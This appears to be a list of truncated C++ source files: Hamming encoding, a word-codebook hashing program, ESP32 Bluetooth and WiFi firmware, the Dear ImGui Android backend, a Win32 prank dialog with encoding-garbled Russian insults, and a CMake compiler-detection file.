    "#include <bitset>\n\nstd::bitset<8> encode_Hamming(std::bitset<4> part)\n{\n    std::bitset<8> encoded;\n\n    bool d1 = part[0];\n    bool d2 = part[1];\n    bool d3 = part[2];\n    bool d4 = part[3];\n\n    bool p1;\n    bool p2;\n    bool p3;\n    bool p4;\n\n    p1 = (d1 + d3 + d4 + 1) % 2;\n    p2 = (d1 + d2 + d4 + 1) % 2;\n    p3 = (d1 + d2 + d3 + 1) % 2;\n    p4 = (1 + p1 + d1 + p2 + d2 + p3 + d3 + d4) % 2;\n\n    encoded[0] = p1;\n    encoded[1] = d1;\n\n    encoded[2] = p2;\n    encoded[3] = d2;\n\n    encoded[4] = p3;\n    encoded[5] = d3;\n\n    encoded[6] = p4;\n    encoded[7] = d4;\n\n\n    return encoded;\n}\n\n\nint Func_1(char sym)\n{\n    std::bitset<8> bits(sym);\n    std::bitset<16> encoded;\n\n    std::bitset<4> first(bits.to_string().substr(0, 4));\n    std::bitset<4> second(bits.to_string().substr(4, 4));\n\n    std::bitset<8> encodedFirstPart = encode_Hamming(first);\n    std::bitset<8> encodedSecondPart = encode_Hamming(second);\n\n    encoded |= (encodedFirstPart.to_ulong() << 8);\n\n    encoded |= encodedSecondPart.to_ulong();\n\n    int value = static_cast<int>(encoded.to_ulong());\n\n    return value;\n}",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <algorithm>\n#include <string>\n#include <cctype>\n#include <unordered_map>\n#include <regex>\n#include <iomanip> // Include for std::hex manipulator\n#include <cstdlib> // Include for srand() and rand()\n#include <random>\n\n/**\n * @brief One way compiler for a hash function\n * \n * @param filename Name of the file containing the dictionary.\n * @param myMap Reference to the unordered_map to store the dictionary.\n * @param code_book_array Array representing the relationship between integers and words.\n * @param array_size Size of the code_book_array.\n */\nvoid load_dict_code_book(const std::string& filename, std::unordered_map<std::string, int>& myMap, int code_book_array[], int array_size);\n\n/**\n * @brief Checks if a given string contains only alphabetic characters.\n * \n * @param word The string to be checked.\n * @return true if the string contains only alphabetic characters, false otherwise.\n */\nbool string_is_alpha(const std::string& word);\n\n/**\n * @brief Converts a string to lowercase.\n * \n * @param word The string to be converted.\n * @return The converted lowercase string.\n */\nstd::string to_lowercase(const std::string& word);\n\n/**\n * @brief Prints each key-value pair in the unordered_map.\n * \n * @param myMap The unordered_map to be printed.\n */\nvoid printMap(const std::unordered_map<std::string, int>& myMap);\n\n/**\n * @brief Main function.\n * \n * @param argc Number of command-line arguments.\n * @param argv Array of command-line arguments.\n * @return 0 if successful, 1 otherwise.\n */\nint main(int argc, char* argv[]) \n{\n    if (argc != 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" <filename>\" << std::endl;\n        return 1; // Exit with error\n    }\n    std::istringstream iss(argv[1]);\n    unsigned int seed = 123;\n\n    /*\n    if (!(iss >> seed)) {\n        std::cerr << \"Invalid seed: \" << argv[1] << std::endl;\n        return 1; // Exit with error\n    }\n    */\n\n    std::unordered_map<std::string, int> myMap;\n    int code_book_size = 26178;\n    int code_bk[code_book_size];  // Initialize the code book or the relationship\n                                  // between an integer and a word\n    for (int i = 0; i < code_book_size; ++i) {\n        code_bk[i] = i + 1;\n    }\n    std::mt19937 gen(seed);\n    std::shuffle(code_bk, code_bk+code_book_size, gen);\n\n    \n    load_dict_code_book(argv[1], myMap, code_bk, code_book_size);\n    std::string input;\n    std::regex alphabetic(\"[a-zA-Z]+\"); // Regular expression to match alphabetic characters\n\n    while (true) {\n        std::cout << \"Enter a sentence (words separated by white spaces, only lower alphabetic characters allowed,\\nno punctuation or apostrophes and enter *end* to exit program):\\n\";\n        std::getline(std::cin, input); // Read the input line by line\n\n        if (input == \"*end*\") {\n            std::cout << \"Exiting the program.\" << std::endl;\n            break; // Exit the while loop\n        }\n\n        // Use istringstream to split the input line into words\n        std::istringstream iss(input);\n        std::string word;\n        std::ostringstream oss;\n        bool is_valid_sentence = true;\n        while (iss >> word) {\n            // Check if the current word contains only alphabetic characters\n             std::string lowered_word = to_lowercase(word);\n            if (std::regex_match(word, alphabetic) &&  myMap.count(lowered_word) > 0) {\n                \n               \n                //if (myMap.count(lowered_word) > 0) {\n                   std::cout << \"Word accepted: \" << word << std::endl;\n                   oss << std::hex << myMap[lowered_word]; // Set output to hexadecimal and append the value\n                // }\n            } else {\n                std::cout << \"Invalid word: \" << word << \". Enter only Oxford Dictionary words with alphabetic characters (a-z and A-Z).\" << std::endl;\n                is_valid_sentence = false; // checks if whole sentence is valid and will print hex value if the whole sentence is correct.\n            }\n        }\n        std::string concatenatedHex = oss.str();\n        if (concatenatedHex.length() && is_valid_sentence)\n        std::cout << \"Your hash value is as follows: \" << concatenatedHex << std::endl;\n    }\n     \n    return 0;\n}\n\nvoid load_dict_code_book(const std::string& filename, std::unordered_map<std::string,\n                         int>& myMap, int code_book_array[], int array_size) \n{\n    // This function loads the dictionary into an unordered_map used to hash words from input\n    std::ifstream file(filename);\n    \n    // Check if the file is successfully opened\n    if (!file.is_open()) {\n        std::cerr << \"Failed to open file: \" << filename << std::endl;\n        return;\n    }\n\n    // Read and store the first word of each line of the file into the unordered_map\n    std::string line;\n    int counter = 0;\n    while (std::getline(file, line)) {\n        std::istringstream iss(line);\n        std::string word;\n        if (iss >> word) {\n        ",
    "#include <Arduino.h>\n#include <BLEDevice.h>\n#include \"esp_task_wdt.h\"\n\n#include \"auxiliary.h\"\n#include \"bluetooth.hpp\"\n#include \"hardware_timer.hpp\"\n#include \"acoustic.hpp\"\n\n\nuuids UUID_generator;\nBluetooth<uuids> bluetooth;\n\nvolatile SemaphoreHandle_t scan_semaphore;\nvolatile SemaphoreHandle_t disconnect_semaphore;\nvolatile int8_t SCAN_ISR = 0;\nvolatile int8_t DISCON_ISR = 0;\nportMUX_TYPE isr_mux = portMUX_INITIALIZER_UNLOCKED;\nTaskHandle_t acoustic_task_handle = NULL;\nTaskHandle_t main_task_handle = NULL;\n\nstd::queue<TransmissionData_t *> received_packets;\n\nvoid main_loop(void *args);\n\n// ISR for handling various semaphores\nvoid ARDUINO_ISR_ATTR set_semaphore()\n{\n    taskENTER_CRITICAL_ISR(&isr_mux);\n    if (DISCON_ISR == 20)\n    {\n        xSemaphoreGiveFromISR(disconnect_semaphore, NULL);\n    }\n    else\n    {\n        DISCON_ISR++;\n    }\n    if (SCAN_ISR == 6)\n    {\n        xSemaphoreGiveFromISR(scan_semaphore, NULL);\n    }\n    else\n    {\n        SCAN_ISR++;\n    }\n    taskEXIT_CRITICAL_ISR(&isr_mux);\n}\n\nvoid setup()\n{\n    Serial.begin(115200);\n    pinMode(LED_BUILTIN, OUTPUT);\n    Serial.printf(\"SERVICE UUID - %s\\n\", UUID_generator.get_service_uuid());\n    Serial.printf(\"CHARACTERISTIC UUID - %s\\n\", UUID_generator.get_characteristic_uuid());\n    bluetooth = Bluetooth<uuids>(UUID_generator);\n    \n    scan_semaphore = xSemaphoreCreateBinary();\n    disconnect_semaphore = xSemaphoreCreateBinary();\n    setup_timer(set_semaphore, 250, 80);\n\n    esp_task_wdt_init(UINT32_MAX, false); // make task_wdt wait as long as possible, until we come up with better solution\n\n    // CPU Core 0: acoustic receive\n    xTaskCreatePinnedToCore(acoustic_receive_loop, \"acoustic_receive_loop\", 4096, NULL, 19, &acoustic_task_handle, 0); // priority at least 19\n    // CPU Core 1: BLE client\n    xTaskCreatePinnedToCore(main_loop, \"main_loop\", 4096*4, NULL, 19, &main_task_handle, 1); // priority at least 19\n}\n\nvoid main_loop(void *args)\n{\n    while (1)\n    {\n        bluetooth.removeOldServers();\n\n        if (xSemaphoreTake(scan_semaphore, 0) == pdTRUE)\n        {\n            bluetooth.scan();\n            bluetooth.tryConnectToServer();\n        }\n\n        if (xSemaphoreTake(disconnect_semaphore, 0) == pdTRUE )\n        {\n            bluetooth.removeOldServers();\n        }\n    }\n}\n\nvoid loop() // intentionally blank\n{\n}\n",
    "// dear imgui: Platform Binding for Android native app\n// This needs to be used along with the OpenGL 3 Renderer (imgui_impl_opengl3)\n\n// Implemented features:\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy AKEYCODE_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\n//  [X] Platform: Mouse support. Can discriminate Mouse/TouchScreen/Pen.\n// Missing features:\n//  [ ] Platform: Clipboard support.\n//  [ ] Platform: Gamepad support. Enable with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n//  [ ] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'. FIXME: Check if this is even possible with Android.\n// Important:\n//  - Consider using SDL or GLFW backend on Android, which will be more full-featured than this.\n//  - FIXME: On-screen keyboard currently needs to be enabled by the application (see examples/ and issue #3446)\n//  - FIXME: Unicode character inputs needs to be passed by Dear ImGui by the application (see examples/ and issue #3446)\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2022-09-26: Inputs: Renamed ImGuiKey_ModXXX introduced in 1.87 to ImGuiMod_XXX (old names still supported).\n//  2022-01-26: Inputs: replaced short-lived io.AddKeyModsEvent() (added two weeks ago) with io.AddKeyEvent() using ImGuiKey_ModXXX flags. Sorry for the confusion.\n//  2022-01-17: Inputs: calling new io.AddMousePosEvent(), io.AddMouseButtonEvent(), io.AddMouseWheelEvent() API (1.87+).\n//  2022-01-10: Inputs: calling new io.AddKeyEvent(), io.AddKeyModsEvent() + io.SetKeyEventNativeData() API (1.87+). Support for full ImGuiKey range.\n//  2021-03-04: Initial version.\n\n#include \"imgui.h\"\n#include \"imgui_impl_android.h\"\n#include <time.h>\n#include <android/native_window.h>\n#include <android/input.h>\n#include <android/keycodes.h>\n#include <android/log.h>\n\n// Android data\nstatic double                                   g_Time = 0.0;\nstatic ANativeWindow*                           g_Window;\nstatic char                                     g_LogTag[] = \"ImGuiExample\";\n\nstatic ImGuiKey ImGui_ImplAndroid_KeyCodeToImGuiKey(int32_t key_code)\n{\n    switch (key_code)\n    {\n        case AKEYCODE_TAB:                  return ImGuiKey_Tab;\n        case AKEYCODE_DPAD_LEFT:            return ImGuiKey_LeftArrow;\n        case AKEYCODE_DPAD_RIGHT:           return ImGuiKey_RightArrow;\n        case AKEYCODE_DPAD_UP:              return ImGuiKey_UpArrow;\n        case AKEYCODE_DPAD_DOWN:            return ImGuiKey_DownArrow;\n        case AKEYCODE_PAGE_UP:              return ImGuiKey_PageUp;\n        case AKEYCODE_PAGE_DOWN:            return ImGuiKey_PageDown;\n        case AKEYCODE_MOVE_HOME:            return ImGuiKey_Home;\n        case AKEYCODE_MOVE_END:             return ImGuiKey_End;\n        case AKEYCODE_INSERT:               return ImGuiKey_Insert;\n        case AKEYCODE_FORWARD_DEL:          return ImGuiKey_Delete;\n        case AKEYCODE_DEL:                  return ImGuiKey_Backspace;\n        case AKEYCODE_SPACE:                return ImGuiKey_Space;\n        case AKEYCODE_ENTER:                return ImGuiKey_Enter;\n        case AKEYCODE_ESCAPE:               return ImGuiKey_Escape;\n        case AKEYCODE_APOSTROPHE:           return ImGuiKey_Apostrophe;\n        case AKEYCODE_COMMA:                return ImGuiKey_Comma;\n        case AKEYCODE_MINUS:                return ImGuiKey_Minus;\n        case AKEYCODE_PERIOD:               return ImGuiKey_Period;\n        case AKEYCODE_SLASH:                return ImGuiKey_Slash;\n        case AKEYCODE_SEMICOLON:            return ImGuiKey_Semicolon;\n        case AKEYCODE_EQUALS:               return ImGuiKey_Equal;\n        case AKEYCODE_LEFT_BRACKET:         return ImGuiKey_LeftBracket;\n        case AKEYCODE_BACKSLASH:            return ImGuiKey_Backslash;\n        case AKEYCODE_RIGHT_BRACKET:        return ImGuiKey_RightBracket;\n        case AKEYCODE_GRAVE:                return ImGuiKey_GraveAccent;\n        case AKEYCODE_CAPS_LOCK:            return ImGuiKey_CapsLock;\n        case AKEYCODE_SCROLL_LOCK:          return ImGuiKey_ScrollLock;\n        case AKEYCODE_NUM_LOCK:             return ImGuiKey_NumLock;\n        case AKEYCODE_SYSRQ:                return ImGuiKey_PrintScreen;\n        case AKEYCODE_BREAK:                return ImGuiKey_Pause;\n        case AKEYCODE_NUMPAD_0:             return ImGuiKey_Keypad0;\n ",
    "#include \"Communications.h\"\n\n\nCommunicator::Communicator(String ssid, String pwd, int port)\n{\n    digitalWrite(LED_BUILTIN, LOW);\n    // ssid, psw, ip, port should be saved in a config file and read upon power up\n    Serial.printf(\"Setting up network: %s\", ssid);\n    setupWiFiNetwork(ssid, pwd);\n    openServer(port);\n    // int retries = 3;\n    // do\n    // {\n    //     std::cout << \".\";\n    //     mStatus = WiFi.begin(ssid.c_str(), psw.c_str());\n    //     delay(5000);\n    //     retries--;/* code */\n    // } while (mStatus != WL_CONNECTED && retries);\n    \n    // if(mStatus != WL_CONNECTED)\n    // {\n    //     std::cout << \"Unable to connect to \" << ssid << std::endl;\n    //     digitalWrite(LED_BUILTIN, HIGH);\n    //     digitalWrite(LEDR, HIGH);\n    //     digitalWrite(LEDG, LOW);\n    //     digitalWrite(LEDB, LOW);\n    // }\n    // else\n    // {\n    //     openServer(ip, port);\n    //     digitalWrite(LED_BUILTIN, HIGH);\n    //     digitalWrite(LEDR, LOW);\n    //     digitalWrite(LEDG, HIGH);\n    //     digitalWrite(LEDB, LOW);\n    // }\n\n}\n\n\nvoid Communicator::setQueue(std::queue<std::vector<int32_t>>* queue)\n{\n    mQueue = queue;\n}\n\n\nvoid Communicator::setupWiFiNetwork(String ssid, String pwd)\n{\n    WiFi.softAP(ssid);  // Add WIFI_PSW if needed\n    Serial.printf(\"Created network %s\\n\", ssid);\n    Serial.printf(\"IP: %s\\n\", WiFi.softAPIP());\n    Serial.printf(\"Signal strength: %d dB\\n\", WiFi.RSSI());\n    mNetwork = true;\n}\n\nvoid Communicator::openServer(int port)\n{\n    if(!mNetwork)\n    {\n        Serial.println(\"Network is not ready. Did you run setupWiFiNetwork()?\");\n    }\n    else\n    {\n        mServer = new WiFiServer(port);\n        mServer->begin();\n\n        Serial.printf(\"Server ready. Listening at port: %d\\n\", port);\n    }\n}\n\nvoid Communicator::handleServer()\n{\n    mRunServer = true;\n    WiFiClient client;\n    Task receivedMessage;\n    String parsedData;\n    \n    Serial.println(\"Running server\");\n    while(mRunServer)\n    {\n        client = mServer->available();\n\n        if(client)\n        {\n            while(client.connected())\n            {\n                if(client.available())\n                {\n                    receivedMessage = readMessage(client);\n                    Serial.printf(\"Received %s\\n\", receivedMessage.raw);\n                    sendACK();\n                    mTasksQueue.push(receivedMessage);\n                }\n            }\n        }\n        else\n        {\n            if(!mTasksQueue.empty())\n            {\n                Task newTask = mTasksQueue.front();\n                mTasksQueue.pop();\n                switch(newTask.taskID)\n                {\n                    case START_ACQUISITION:\n                        Serial.println(\"START_ACQUISITION task received\");\n                        break;\n\n                    case STOP_ACQUISITION:\n                        Serial.println(\"STOP_ACQUISITION task received\");\n                        break;\n\n                    case TIMED_ACQUISITION:\n                        Serial.println(\"TIMED_ACQUISITION task received\");\n                        break;\n\n                    case GET_CONFIGURATION:\n                        Serial.println(\"GET_CONFIGURATION task received\");\n                        break;\n\n                    case UPDATE_CONFIGURATION:\n                        Serial.println(\"UPDATE_CONFIGURATION task received\");\n                        break;\n\n                    case POWER_OFF:\n                        Serial.println(\"POWER_OFF task received\");\n                        break;\n\n                    case ALIVE:\n                        Serial.println(\"ALIVE task received\");\n                        sendACK();\n                        break;\n\n                }\n            }\n        }\n\n    }\n\n}\n\nvoid Communicator::setDataLoop()\n{\n    mCollectingDataFlag = true;\n    String parsedData;\n    while(!mQueue->empty() && !mCollectingDataFlag)\n    {\n        parsedData = formatSensorData(mQueue->front());\n        mQueue->pop();\n        sendMessage(parsedData);\n    }\n}\n\nvoid Communicator::sendACK()\n{\n    sendMessage(\"OK\");\n}\n\nTask Communicator::readMessage(WiFiClient client)\n{\n    String rcvMsg = client.readString();\n    \n    Task parsedMsg;\n    parsedMsg.raw = rcvMsg;\n\n    size_t pos = 0;\n    size_t tokenPos = 0;\n    String token;\n    String param;\n    while ((pos = rcvMsg.indexOf(MSG_DELIMITER)) != -1) {\n        token = rcvMsg.substring(0, pos);\n        switch (tokenPos)\n        {\n        case 0:\n            parsedMsg.taskID = static_cast<TASK_ID>(token.toInt());\n            break;\n        \n        case 1:\n            parsedMsg.numParams = token.toInt();\n            break;\n        \n        case 2:\n            parseParametersString(token, parsedMsg);\n            break;\n        default:\n            Serial.printf(\"Unexpected message length: %d\\n\", token);\n        }\n        tokenPos += 1;\n        rcvMsg.remove(0, pos + 1);\n    }\n};\n\nvoid Communicator::parseParametersString(String rawString, Task &taskInformation)\n{\n    size_t pos = 0;\n    String token;",
    "#include <windows.h> \n#include <windowsx.h>\n#include \"iostream\"\nusing namespace std;\nbool isButtonHovered = false;\nHWND buttonNo, buttonYes, text, Answer, Answer2, Answer3, Answer4;\n\nvoid huy(int i);\n\nvoid bText(int t, int e, int x, HDC hdc, int b, int c, int k) {\n    SetBkColor(hdc, RGB(t, e, x));\n    SetTextColor(hdc, RGB(b, c, k));\n}\n\nvoid PAINT(HWND hwnd) {\n    PAINTSTRUCT ps;\n    HDC hdc = BeginPaint(hwnd, &ps);\n    HBRUSH hBrush = CreateSolidBrush(RGB(36, 36, 36));\n\n    FillRect(hdc, &ps.rcPaint, hBrush);\n\n    //HBRUSH hBrush2 = CreateSolidBrush(RGB(233, 0, 0));\n\n    //SelectObject(hdc, hBrush2);\n\n    //Rectangle(hdc, 300, 300, 200, 200);\n\n\n    DeleteObject(hBrush);\n    //DeleteObject(hBrush2);\n    EndPaint(hwnd, &ps);\n}\n\nvoid DRAWITEM(LPDRAWITEMSTRUCT lpDrawItem, const wchar_t* word, HWND button) {\n    HDC hdc = lpDrawItem->hDC;\n    RECT rc = lpDrawItem->rcItem;\n\n    HBRUSH hBrush = CreateSolidBrush(RGB(36, 36, 36));\n    FillRect(hdc, &rc, hBrush);\n\n    bText(36, 36, 36, hdc, 255, 255, 255);\n\n    if (lpDrawItem->hwndItem == button) DrawText(hdc, word, -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);\n    DeleteObject(hBrush);\n}\n\nLRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {\n    switch (msg) {\n    case WM_DESTROY:\n        PostQuitMessage(0);\n        return 0;\n\n    case WM_SIZE: {\n        int width = LOWORD(lParam);\n        int height = HIWORD(lParam);\n\n        int textX = width / 2 - 50;\n        int textY = height * 3 / 4;\n\n        int buttonNoX = width / 4 - 50;\n        int buttonYesX = width * 3 / 4 - 50;\n        int buttonY = height / 3;\n\n        SetWindowPos(buttonNo, NULL, buttonNoX, buttonY, 100, 30, SWP_NOZORDER);\n        SetWindowPos(buttonYes, NULL, buttonYesX, buttonY, 100, 30, SWP_NOZORDER);\n        SetWindowPos(text, NULL, textX, textY, 100, 30, SWP_NOZORDER);\n        break;\n    }\n\n    case WM_COMMAND:\n        if (HIWORD(wParam) == BN_CLICKED) {\n            MessageBox(hwnd, L\"You clicked Yes!\", L\"Message\", MB_OK | MB_ICONINFORMATION);\n        }\n\n        if (lParam == (LPARAM)buttonNo) {\n            huy(1);\n        }\n        else if (lParam == (LPARAM)buttonYes) {\n            MessageBox(hwnd, L\"You clicked Yes!\", L\"Message\", MB_OK | MB_ICONINFORMATION);\n        }\n        return 0;\n\n    case WM_CTLCOLORSTATIC: {\n        HDC hdc = (HDC)wParam;\n\n        bText(36, 36, 36, hdc, 170, 170, 170);\n\n        return (INT_PTR)CreateSolidBrush(RGB(0, 0, 0));\n    }\n\n    case WM_DRAWITEM: {\n        LPDRAWITEMSTRUCT lpDrawItem = (LPDRAWITEMSTRUCT)lParam;\n        if (lpDrawItem->hwndItem == buttonYes)\n            DRAWITEM(lpDrawItem, L\"\u00ed\u00e5 \u00ef\u00e8\u00e4\u00ee\u00f0\", buttonYes);\n\n        if (lpDrawItem->hwndItem == buttonNo)\n            DRAWITEM(lpDrawItem, L\"\u00cd\u00e5\u00f2\", buttonNo);\n\n    }\n\n    case WM_PAINT: {\n        PAINT(hwnd);\n        break;\n    }\n    }\n    return DefWindowProc(hwnd, msg, wParam, lParam);\n}\n\nLRESULT CALLBACK childWnd(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {\n    switch (msg) {\n    case WM_CTLCOLORSTATIC: {\n        HDC hdc = (HDC)wParam;\n\n        bText(45, 45, 45, hdc, 170, 170, 170);\n\n        return (INT_PTR)CreateSolidBrush(RGB(0, 0, 0));\n    }\n\n    case WM_DRAWITEM: {\n        LPDRAWITEMSTRUCT lpDrawItem = (LPDRAWITEMSTRUCT)lParam;\n\n        if (lpDrawItem->hwndItem == Answer)\n            DRAWITEM(lpDrawItem, L\"\u00d8\u00eb\u00fe\u00f5\u00e8 \u00e0\u00f0\u00e3\u00f3\u00ec\u00e5\u00ed\u00f2!\", Answer);\n        if (lpDrawItem->hwndItem == Answer2)\n            DRAWITEM(lpDrawItem, L\"\u00c0\u00f0\u00e3\u00f3\u00ec\u00e5\u00ed\u00f2 \u00ed\u00e5 \u00e2\u00e5\u00f7\u00e5\u00ed, \u00ef\u00e8\u00e4\u00ee\u00f0 \u00ee\u00e1\u00e5\u00f1\u00ef\u00e5\u00f7\u00e5\u00ed)\", Answer2);;\n        if (lpDrawItem->hwndItem == Answer3)\n            DRAWITEM(lpDrawItem, L\"\u00cf\u00e8\u00e4\u00ee\u00f0 \u00ec\u00e0\u00f4\u00e8\u00ee\u00e7\u00ed\u00fb\u00e9, \u00f2\u00e2\u00ee\u00e9 \u00e0\u00ed\u00e0\u00eb \u00f1\u00ef\u00e8\u00e4\u00ee\u00e7\u00ed\u00fb\u00e9\", Answer3);\n        if (lpDrawItem->hwndItem == Answer4)\n            DRAWITEM(lpDrawItem, L\"\u00c0\u00ed\u00e0\u00eb \u00ec\u00ee\u00e9 \u00e2\u00e5\u00f7\u00e5\u00ed, \u00f2\u00e2\u00ee\u00e9 \u00ef\u00ee\u00ec\u00e5\u00f7\u00e5\u00ed)\", Answer4);\n    }\n\n    case WM_COMMAND:\n        if (lParam == (LPARAM)Answer)huy(2);\n        if (lParam == (LPARAM)Answer2)huy(3);\n        if (lParam == (LPARAM)Answer3)huy(4);\n        if (lParam == (LPARAM)Answer4)huy(5);\n\n    case WM_PAINT: {\n        PAINT(hwnd);\n        break;\n    }\n                 if (msg == WM_CLOSE)return 0;\n    default: return DefWindowProc(hwnd, msg, wParam, lParam);\n    }\n}\n\nvoid huy(int i) {\n    const wchar_t name[] = L\"childWnd\";\n    WNDCLASS wc{};\n    wc.lpfnWndProc = childWnd;\n    wc.hInstance = GetModuleHandle(NULL);\n    wc.lpszClassName = name;\n    RegisterClass(&wc);\n\n    HWND hwnd = CreateWindowEx(0, name, L\"Dicks\", WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, 400, 200, NULL, NULL, NULL, NULL);\n    if (hwnd != nullptr)ShowWindow(hwnd, SW_SHOW);\n    if (i == 1) {\n        wchar_t name[] = L\"huy\";\n        Answer = CreateWindow(L\"BUTTON\", L\"\u00d8\u00eb\u00fe\u00f5\u00e8 \u00e0\u00f0\u00e3\u00f3\u00ec\u00e5\u00ed\u00f2. \", WS_VISIBLE | WS_CHILD | BS_OWNERDRAW, 60, 35, 350, 30, hwnd, NULL, NULL, NULL);\n        text = CreateWindow(L\"STATIC\", L\"\u00f5\u00e0\u00f5\u00e0\u00f5\u00f5\u00e0, \u00ef\u00e8\u00e4\u00ee\u00f0\u00e0 \u00ee\u00f2\u00e2\u00e5\u00f2.\", WS_VISIBLE | WS_CHILD | WS_EX_TRANSPARENT | BS_OWNERDRAW, 150, 100, 200, 20, hwnd, NULL, NULL, NULL);\n    }\n    if (i == 2) {\n        Answer2 = CreateWindow(L\"BUTTON\", L\"\u00c0\u00f0\u00e3\u00f3\u00ec\u00e5\u00ed\u00f2 \u00ed\u00e5 \u00e2\u00e5\u00f7\u00e5\u00ed, \u00ef\u00e8\u00e4\u00ee\u00f0 \u00ee\u00e1\u00e5\u00f1\u00ef\u00e5\u00f7\u00e5\u00ed.\", WS_VISIBLE | WS_CHILD | BS_OWNERDRAW, 60,",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR 